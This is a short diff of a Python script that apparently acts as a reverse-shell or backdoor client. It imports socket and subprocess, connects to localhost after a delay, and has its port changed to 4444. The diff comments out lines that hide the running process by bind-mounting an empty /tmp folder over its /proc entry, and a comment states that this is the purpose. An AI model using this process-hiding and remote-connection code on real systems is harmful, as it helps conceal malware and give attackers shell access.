@@ -2,12 +2,12 @@
 
 import os,socket,subprocess,string,time
 import random as r
-ch = string.uppercase + string.digits
-token = "".join(r.choice(ch) for i in range(5))
-pid = os.getpid()
-os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token)) # make bind mount on the current process folder in /proc to hide it
+#ch = string.uppercase + string.digits
+#token = "".join(r.choice(ch) for i in range(5))
+#pid = os.getpid()
+#os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token)) # make bind mount on the current process folder in /proc to hide it
 host = "localhost"
-port = 8888
+port = 4444
 def MakeConnection(h,p):
 	try:
 		time.sleep(5)
